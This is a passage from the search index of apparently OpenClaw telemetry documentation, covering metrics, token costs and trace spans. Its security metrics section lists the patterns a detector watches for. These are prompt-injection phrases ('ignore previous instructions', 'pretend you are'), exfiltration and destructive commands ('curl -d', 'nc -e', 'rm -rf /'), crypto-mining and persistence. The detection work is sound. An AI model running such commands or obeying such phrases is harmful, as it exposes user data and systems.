timeouts, invalid requests, etc.). A spike here usually means rate limiting or API issues.</p>"},{"location":"telemetry/metrics/#openclawllmtokenstotal","title":"<code>openclaw.llm.tokens.total</code>","text":"Type Counter Unit tokens Description Total tokens consumed (prompt + completion) <p>The primary cost metric. Combine with model information to estimate costs.</p>"},{"location":"telemetry/metrics/#openclawllmtokensprompt","title":"<code>openclaw.llm.tokens.prompt</code>","text":"Type Counter Unit tokens Description Prompt tokens consumed <p>Tracks input tokens. High prompt token counts may indicate large system prompts, long conversation histories, or excessive context injection.</p>"},{"location":"telemetry/metrics/#openclawllmtokenscompletion","title":"<code>openclaw.llm.tokens.completion</code>","text":"Type Counter Unit tokens Description Completion tokens consumed <p>Tracks output tokens. Useful for understanding response verbosity.</p>"},{"location":"telemetry/metrics/#openclawllmduration","title":"<code>openclaw.llm.duration</code>","text":"Type Histogram Unit ms Description LLM request duration in milliseconds <p>Latency distribution for LLM calls. Use percentiles (p50, p95, p99) to understand typical and worst-case latency.</p>"},{"location":"telemetry/metrics/#tool-metrics","title":"Tool Metrics","text":""},{"location":"telemetry/metrics/#openclawtoolcalls","title":"<code>openclaw.tool.calls</code>","text":"Type Counter Unit calls Attributes <code>tool.name</code> Description Total tool invocations <p>Broken down by tool name. Shows which tools are used most frequently.</p> <p>Example attribute values: <code>exec</code>, <code>Read</code>, <code>Write</code>, <code>web_fetch</code>, <code>web_search</code>, <code>browser</code>, <code>memory_search</code></p>"},{"location":"telemetry/metrics/#openclawtoolerrors","title":"<code>openclaw.tool.errors</code>","text":"Type Counter Unit errors Attributes <code>tool.name</code> Description Total tool execution errors <p>Broken down by tool name. High error rates on specific tools may indicate configuration issues or external service problems.</p>"},{"location":"telemetry/metrics/#openclawtoolduration","title":"<code>openclaw.tool.duration</code>","text":"Type Histogram Unit ms Attributes <code>tool.name</code> Description Tool execution duration in milliseconds <p>How long each tool takes. Useful for identifying slow tools that bottleneck agent turns.</p>"},{"location":"telemetry/metrics/#agent-metrics","title":"Agent Metrics","text":""},{"location":"telemetry/metrics/#openclawagentturn_duration","title":"<code>openclaw.agent.turn_duration</code>","text":"Type Histogram Unit ms Description Full agent turn duration (LLM + tools + processing) <p>End-to-end time for a complete agent turn. This is the user-perceived latency.</p>"},{"location":"telemetry/metrics/#session-metrics","title":"Session Metrics","text":""},{"location":"telemetry/metrics/#openclawsessionresets","title":"<code>openclaw.session.resets</code>","text":"Type Counter Unit resets Attributes <code>command.source</code> Description Total session resets <p>How often sessions are reset via <code>/new</code> or <code>/reset</code>. Broken down by channel source.</p>"},{"location":"telemetry/metrics/#openclawsessionsactive","title":"<code>openclaw.sessions.active</code>","text":"Type UpDownCounter Unit sessions Description Currently active sessions <p>A gauge-like metric showing the number of active sessions at any point in time.</p>"},{"location":"telemetry/metrics/#message-metrics","title":"Message Metrics","text":""},{"location":"telemetry/metrics/#openclawmessagesreceived","title":"<code>openclaw.messages.received</code>","text":"Type Counter Unit messages Description Total inbound messages <p>Counts messages received from users across all channels.</p>"},{"location":"telemetry/metrics/#openclawmessagessent","title":"<code>openclaw.messages.sent</code>","text":"Type Counter Unit messages Description Total outbound messages <p>Counts messages sent by the agent across all channels.</p>"},{"location":"telemetry/metrics/#security-metrics","title":"Security Metrics","text":""},{"location":"telemetry/metrics/#openclawsecurityevents","title":"<code>openclaw.security.events</code>","text":"Type Counter Unit events Attributes <code>detection</code>, <code>severity</code> Description Total security events detected across all detection types <p>The umbrella counter for all security detections. Use <code>detection</code> to filter by type (<code>sensitive_file_access</code>, <code>prompt_injection</code>, <code>dangerous_command</code>) and <code>severity</code> to filter by level (<code>critical</code>, <code>high</code>, <code>warning</code>).</p>"},{"location":"telemetry/metrics/#openclawsecuritysensitive_file_access","title":"<code>openclaw.security.sensitive_file_access</code>","text":"Type Counter Unit events Attributes <code>file_pattern</code> Description Attempts to access sensitive files (credentials, SSH keys, .env, etc.) <p>Triggers when the agent reads, writes, or edits files matching sensitive patterns (<code>.env</code>, <code>.ssh/</code>, <code>credentials</code>, <code>api_key</code>, etc.). The <code>file_pattern</code> attribute contains the regex source that matched.</p>"},{"location":"telemetry/metrics/#openclawsecurityprompt_injection","title":"<code>openclaw.security.prompt_injection</code>","text":"Type Counter Unit events Attributes <code>pattern_count</code> Description Prompt injection attempts detected in inbound messages <p>Detects social engineering patterns like \"ignore previous instructions\", fake <code>[SYSTEM]</code> tags, role manipulation (\"pretend you are\"), and jailbreak attempts. The <code>pattern_count</code> attribute shows how many patterns matched (more = higher confidence).</p>"},{"location":"telemetry/metrics/#openclawsecuritydangerous_command","title":"<code>openclaw.security.dangerous_command</code>","text":"Type Counter Unit events Attributes <code>command_type</code> Description Dangerous shell command executions detected <p>Catches data exfiltration (<code>curl -d</code>, <code>nc -e</code>), destructive commands (<code>rm -rf /</code>, <code>mkfs</code>), privilege escalation (<code>chmod +s</code>), crypto mining (<code>xmrig</code>), and persistence mechanisms (<code>crontab</code>, <code>.bashrc</code> modification). The <code>command_type</code> attribute describes the matched threat.</p>"},{"location":"telemetry/metrics/#dashboard-examples","title":"Dashboard Examples","text":""},{"location":"telemetry/metrics/#token-usage-over-time","title":"Token Usage Over Time","text":"<p>Track cost by monitoring <code>openclaw.llm.tokens.total</code> over time. In Dynatrace:</p> <pre><code>timeseries avg(openclaw.llm.tokens.total), by:{gen_ai.request.model}\n</code></pre>"},{"location":"telemetry/metrics/#llm-latency-percentiles","title":"LLM Latency Percentiles","text":"<pre><code>timeseries percentile(openclaw.llm.duration, 50, 95, 99)\n</code></pre>"},{"location":"telemetry/metrics/#tool-error-rate","title":"Tool Error Rate","text":"<pre><code>timeseries sum(openclaw.tool.errors) / sum(openclaw.tool.calls) * 100, by:{tool.name}\n</code></pre>"},{"location":"telemetry/metrics/#most-used-tools","title":"Most Used Tools","text":"<pre><code>timeseries sum(openclaw.tool.calls), by:{tool.name}\n</code></pre>"},{"location":"telemetry/metrics/#security-events-over-time","title":"Security Events Over Time","text":"<pre><code>timeseries sum(openclaw.security.events), by:{detection, severity}\n</code></pre>"},{"location":"telemetry/metrics/#sensitive-file-access-by-pattern","title":"Sensitive File Access by Pattern","text":"<pre><code>timeseries sum(openclaw.security.sensitive_file_access), by:{file_pattern}\n</code></pre>"},{"location":"telemetry/metrics/#dangerous-commands-by-type","title":"Dangerous Commands by Type","text":"<pre><code>timeseries sum(openclaw.security.dangerous_command), by:{command_type}\n</code></pre>"},{"location":"telemetry/metrics/#prompt-injection-attempts","title":"Prompt Injection Attempts","text":"<pre><code>timeseries sum(openclaw.security.prompt_injection), by:{pattern_count}\n</code></pre>"},{"location":"telemetry/tokens/","title":"Token Usage Attributes","text":"<p>Understanding the GenAI token usage attributes in OpenClaw observability.</p>"},{"location":"telemetry/tokens/#token-attributes-overview","title":"Token Attributes Overview","text":"Attribute Description Cost Impact <code>gen_ai.usage.input_tokens</code> Tokens in the prompt sent to the model Standard input rate <code>gen_ai.usage.output_tokens</code> Tokens in the model's response Higher rate (typically 3-5x input) <code>gen_ai.usage.cache_read_tokens</code> Tokens read from prompt cache 90% cheaper than input <code>gen_ai.usage.cache_write_tokens</code> Tokens written to prompt cache 25% more expensive than input <code>gen_ai.usage.total_tokens</code> Sum of all token types \u2014"},{"location":"telemetry/tokens/#how-tokens-are-calculated","title":"How Tokens Are Calculated","text":""},{"location":"telemetry/tokens/#input-tokens","title":"Input Tokens","text":"<p>What counts: Everything you send to the model: - System prompt (AGENTS.md, SOUL.md, TOOLS.md, etc.) - Conversation history (all previous messages) - Current user message - Tool definitions and descriptions - Any injected context</p> <p>Example breakdown: <pre><code>System prompt:     ~8,000 tokens (workspace files + tool list)\nHistory:           ~5,000 tokens (previous messages)\nCurrent message:      ~50 tokens (user's question)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nTotal input:      ~13,050 tokens\n</code></pre></p>"},{"location":"telemetry/tokens/#output-tokens","title":"Output Tokens","text":"<p>What counts: Everything the model generates: - The assistant's response text - Tool calls (function names + arguments) - Thinking/reasoning (if using extended thinking)</p> <p>Note: Output tokens are typically 3-5x more expensive than input tokens.</p>"},{"location":"telemetry/tokens/#cache-read-tokens","title":"Cache Read Tokens","text":"<p>What it is: Anthropic's prompt caching feature. When you send the same prefix (system prompt + early conversation), Claude can reuse a cached version instead of reprocessing it.</p> <p>When it happens: - Same system prompt across requests - Stable conversation history prefix - Request made within cache TTL (typically 5 minutes)</p> <p>Cost benefit: Cache reads cost ~90% less than regular input tokens.</p> <p>Your example: <code>918,174</code> cache read tokens means the model reused ~918K tokens from cache instead of reprocessing them. This saved significant cost!</p>"},{"location":"telemetry/tokens/#cache-write-tokens","title":"Cache Write Tokens","text":"<p>What it is: When new content is added to the cache for future requests.</p> <p>When it happens: - First request with a new system prompt - Conversation grows beyond previously cached content - Cache TTL expired and content needs re-caching</p> <p>Cost impact: Cache writes cost ~25% more than regular input tokens, but enable cheaper cache reads on subsequent requests.</p> <p>Your example: <code>62,437</code> cache write tokens means new content was cached for future use.</p>"},{"location":"telemetry/tokens/#real-world-example","title":"Real-World Example","text":"<p>Your span shows: <pre><code>cache_read:   918,174 tokens  (reused from cache \u2014 very cheap!)\ncache_write:   62,437 tokens  (newly cached \u2014 slight premium)\ninput:            156 tokens  (new content not in cache)\noutput:        17,831 tokens  (model's response)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ntotal:        998,598 tokens\n</code></pre></p> <p>What this means:</p> <ol> <li> <p>Large context reuse \u2014 918K tokens were already cached (system prompt + conversation history). You paid ~10% of normal input cost for these.</p> </li> <li> <p>Incremental caching \u2014 62K new tokens were added to cache. Slightly more expensive now, but future requests can read them cheaply.</p> </li> <li> <p>Minimal new input \u2014 Only 156 tokens were truly \"new\" input (probably just the latest message).</p> </li> <li> <p>Reasonable output \u2014 17,831 tokens is a substantial response (maybe code generation or detailed explanation).</p> </li> </ol>"},{"location":"telemetry/tokens/#cost-calculation","title":"Cost Calculation","text":""},{"location":"telemetry/tokens/#current-anthropic-api-pricing-2026","title":"Current Anthropic API Pricing (2026)","text":"Model Input Output Cache Read Cache Write Opus 4.5 $5/MTok $25/MTok $0.50/MTok $6.25/MTok Sonnet 4.5 $3/MTok $15/MTok $0.30/MTok $3.75/MTok Haiku 4.5 $1/MTok $5/MTok $0.10/MTok $1.25/MTok <p>(MTok = Million Tokens)</p>"},{"location":"telemetry/tokens/#example-cost-breakdown-opus-45","title":"Example Cost Breakdown (Opus 4.5)","text":"Token Type Count Rate (per 1M) Cost Cache read 918,174 $0.50 $0.46 Cache write 62,437 $6.25 $0.39 Input 156 $5.00 $0.001 Output 17,831 $25.00 $0.45 Total ~$1.30 <p>Without caching, the same request would cost: - All input at standard rate: (918,174 + 62,437 + 156) \u00d7 $5/1M = $4.90 - Output: $0.45 - Total without cache: $5.35</p> <p>Savings from caching: ~76%</p>"},{"location":"telemetry/tokens/#important-subscriptions-vs-api","title":"Important: Subscriptions vs API","text":"Claude Subscription API (OpenClaw uses this) Free: $0 Pay per token Pro: $20/month No monthly fee Max: $100-200/month Billed to API account <p>Your Claude Pro/Max subscription does NOT cover OpenClaw usage! OpenClaw uses the API, which is billed separately.</p>"},{"location":"telemetry/tokens/#why-total-doesnt-equal-sum","title":"Why Total Doesn't Equal Sum","text":"<p>You might notice: <pre><code>cache_read + cache_write + input + output = 998,598\n</code></pre></p> <p>The <code>total_tokens</code> is the sum of all types. Some backends may calculate it differently or include additional overhead tokens.</p>"},{"location":"telemetry/tokens/#optimizing-token-usage","title":"Optimizing Token Usage","text":""},{"location":"telemetry/tokens/#reduce-input-tokens","title":"Reduce Input Tokens","text":"<ol> <li>Trim workspace files \u2014 Keep AGENTS.md, SOUL.md concise</li> <li>Use <code>/compact</code> \u2014 Summarize long conversations</li> <li>Prune tool list \u2014 Disable unused tools/skills</li> </ol>"},{"location":"telemetry/tokens/#maximize-cache-hits","title":"Maximize Cache Hits","text":"<ol> <li>Stable system prompts \u2014 Don't change workspace files frequently</li> <li>Consistent conversation prefix \u2014 Same session = better caching</li> <li>Heartbeat within TTL \u2014 Keep cache warm with periodic requests</li> </ol>"},{"location":"telemetry/tokens/#control-output","title":"Control Output","text":"<ol> <li>Be specific \u2014 Vague prompts generate verbose responses</li> <li>Request concise answers \u2014 \"Brief answer:\" prefix helps</li> <li>Use appropriate models \u2014 Smaller models for simple tasks</li> </ol>"},{"location":"telemetry/tokens/#monitoring-token-usage","title":"Monitoring Token Usage","text":""},{"location":"telemetry/tokens/#key-metrics-to-watch","title":"Key Metrics to Watch","text":"<pre><code># Total token cost over time\nsum(rate(openclaw_tokens_total[5m])) by (model)\n\n# Cache hit ratio\nsum(openclaw_tokens{type=\"cache_read\"}) / \nsum(openclaw_tokens{type=~\"cache_read|input\"})\n\n# Output to input ratio (efficiency)\nsum(openclaw_tokens{type=\"output\"}) /\nsum(openclaw_tokens{type=\"input\"})\n</code></pre>"},{"location":"telemetry/tokens/#alerting-thresholds","title":"Alerting Thresholds","text":"<p>Consider alerts for: - Single request &gt; 100K output tokens - Cache hit ratio &lt; 50% - Hourly cost &gt; $X threshold</p>"},{"location":"telemetry/tokens/#see-also","title":"See Also","text":"<ul> <li>Anthropic Prompt Caching</li> <li>OpenTelemetry GenAI Semantic Conventions</li> <li>OpenClaw Token Use Docs</li> </ul>"},{"location":"telemetry/traces/","title":"Traces Reference","text":"<p>The plugin generates connected distributed traces using OpenClaw's hook-based plugin API.</p>"},{"location":"telemetry/traces/#trace-structure","title":"Trace Structure","text":"<p>Every user message produces a trace tree:</p> <pre><code>openclaw.request (SERVER span \u2014 full message lifecycle)\n\u251c\u2500\u2500 openclaw.agent.turn (INTERNAL \u2014 LLM processing)\n\u2502   \u251c\u2500\u2500 gen_ai.usage.input_tokens: 4521\n\u2502   \u251c\u2500\u2500 gen_ai.usage.output_tokens: 892\n\u2502   \u251c\u2500\u2500 gen_ai.usage.total_tokens: 5413\n\u2502   \u251c\u2500\u2500 gen_ai.response.model: claude-opus-4-5\n\u2502   \u251c\u2500\u2500 tool.exec (INTERNAL \u2014 156ms)\n\u2502   \u251c\u2500\u2500 tool.Read (INTERNAL \u2014 12ms)\n\u2502   \u2514\u2500\u2500 tool.web_fetch (INTERNAL \u2014 1200ms)\n\u2514\u2500\u2500 openclaw.command.new (INTERNAL \u2014 if session reset)\n</code></pre> <p>All spans within a request share the same <code>traceId</code> and are linked via parent-child relationships.</p>"},{"location":"telemetry/traces/#request-span","title":"Request Span","text":"<p>Created by the <code>message_received</code> hook. This is the root span for the entire request lifecycle.</p> Field Value Span Name <code>openclaw.request</code> Kind <code>SERVER</code> <p>Attributes:</p> Attribute Type Description <code>openclaw.message.channel</code> string Source channel (<code>whatsapp</code>, <code>telegram</code>, <code>discord</code>, etc.) <code>openclaw.session.key</code> string Session identifier <code>openclaw.message.direction</code> string Always <code>\"inbound\"</code> <code>openclaw.message.from</code> string Sender identifier <code>openclaw.request.duration_ms</code> int Total request duration"},{"location":"telemetry/traces/#agent-turn-span","title":"Agent Turn Span","text":"<p>Created by <code>before_agent_start</code>, ended by <code>agent_end</code>. Child of the request span.</p> Field Value Span Name <code>openclaw.agent.turn</code> Kind <code>INTERNAL</code> <p>Attributes:</p> Attribute Type Description <code>openclaw.agent.id</code> string Agent identifier <code>openclaw.session.key</code> string Session identifier <code>openclaw.agent.model</code> string Model requested <code>openclaw.agent.duration_ms</code> int Turn duration in milliseconds <code>openclaw.agent.success</code> boolean Whether the turn completed successfully <code>openclaw.agent.error</code> string Error message (if failed) <code>gen_ai.usage.input_tokens</code> int Total input tokens (including cache read/write) <code>gen_ai.usage.output_tokens</code> int Total output tokens <code>gen_ai.usage.total_tokens</code> int Sum of input + output tokens <code>gen_ai.response.model</code> string Actual model used (from last assistant message) <p>Token Counts</p> <p>Token counts are summed across all assistant messages in the turn. If the agent makes multiple LLM calls (e.g., tool use loop), the totals reflect all calls combined. Cache tokens (<code>cacheRead</code>, <code>cacheWrite</code>) are included in the input token count.</p>"},{"location":"telemetry/traces/#tool-execution-spans","title":"Tool Execution Spans","text":"<p>Created by the <code>tool_result_persist</code> hook. Child of the agent turn span.</p> Field Value Span Name <code>tool.&lt;tool_name&gt;</code> Kind <code>INTERNAL</code> <p>Examples: <code>tool.exec</code>, <code>tool.web_fetch</code>, <code>tool.browser</code>, <code>tool.Read</code>, <code>tool.Write</code>, <code>tool.memory_search</code>, <code>tool.Edit</code></p> <p>Attributes:</p> Attribute Type Description <code>openclaw.tool.name</code> string Tool name <code>openclaw.tool.call_id</code> string Unique tool call identifier <code>openclaw.tool.is_synthetic</code> boolean Whether the tool call is synthetic <code>openclaw.tool.result_chars</code> int Total characters in result <code>openclaw.tool.result_parts</code> int Number of content parts in result <code>openclaw.session.key</code> string Session identifier <code>openclaw.agent.id</code> string Agent identifier <p>Status: <code>OK</code> on success, <code>ERROR</code> if the tool returned an error.</p>"},{"location":"telemetry/traces/#command-spans","title":"Command Spans","text":"<p>Created when session commands are issued.</p> Span Name Kind Description <code>openclaw.command.new</code> INTERNAL <code>/new</code> command <code>openclaw.command.reset</code> INTERNAL <code>/reset</code> command <code>openclaw.command.stop</code> INTERNAL <code>/stop</code> command <p>Attributes:</p> Attribute Type Description <code>openclaw.command.action</code> string Command name <code>openclaw.command.session_key</code> string Session identifier <code>openclaw.command.source</code> string Command source"},{"location":"telemetry/traces/#gateway-spans","title":"Gateway Spans","text":"Span Name Kind Description <code>openclaw.gateway.startup</code> INTERNAL Gateway startup event"},{"location":"telemetry/traces/#trace-context-propagation","title":"Trace Context Propagation","text":"<p>The plugin maintains a <code>sessionContextMap</code> keyed by <code>sessionKey</code>:</p> <ol> <li><code>message_received</code> creates a root span and stores its context</li> <li><code>before_agent_start</code> creates an agent turn span as a child of the root</li> <li><code>tool_result_persist</code> creates tool spans as children of the agent turn</li> <li><code>agent_end</code> ends the agent turn and root spans, cleans up the context</li> </ol> <p>Stale contexts (no <code>agent_end</code> within 5 minutes) are automatically cleaned up.</p>"},{"location":"telemetry/traces/#example-dql-queries-dynatrace","title":"Example DQL Queries (Dynatrace)","text":"<p>Token usage per agent turn:</p> <pre><code>fetch spans, samplingRatio:1\n| filter contains(endpoint.name, \"openclaw.agent.turn\")\n| fields start_time, duration, gen_ai.usage.input_tokens,\n         gen_ai.usage.output_tokens, gen_ai.usage.total_tokens,\n         gen_ai.response.model\n| sort start_time desc\n| limit 20\n</code></pre> <p>Tool execution breakdown:</p> <pre><code>fetch spans, samplingRatio:1\n| filter startsWith(span.name, \"tool.\")\n| fields start_time, span.name, duration, openclaw.tool.result_chars\n| sort start_time desc\n| limit 50\n</code></pre> <p>Full trace for a session:</p> <pre><code>fetch spans, samplingRatio:1\n| filter openclaw.session.key == \"agent:main:main\"\n| fields start_time, span.name, duration, span.kind, trace.id\n| sort start_time desc\n</code></pre>"},{"location":"telemetry/traces/#semantic-conventions","title":"Semantic Conventions","text":"<p>The plugin follows OpenTelemetry GenAI Semantic Conventions for token-related attributes (<code>gen_ai.usage.*</code>, <code>gen_ai.response.model</code>). Custom OpenClaw attributes use the <code>openclaw.*</code> namespace.</p>"}]}